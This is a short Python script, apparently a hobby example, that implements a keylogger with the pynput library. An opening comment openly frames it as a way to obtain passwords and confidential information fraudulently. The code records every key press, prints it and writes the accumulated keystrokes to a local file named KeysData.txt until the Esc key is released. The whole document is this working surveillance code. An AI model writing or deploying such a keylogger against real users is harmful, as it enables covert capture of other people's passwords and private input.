# A Key Logger is a computer program that records every keystroke made by a computer user, especially in order to gain fraudulent access to passwords and other confidential information.

from pynput.keyboard import Key,Listener

k=[]

def on_press(key):
    k.append(key)
    write(k)
    print(key)

def write(var):
    with open("KeysData.txt","w") as f:
        for i in var:
            new_var = str(i).replace("'",'')
            f.write(new_var)
            f.write("")

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release,) as l:
    l.join()

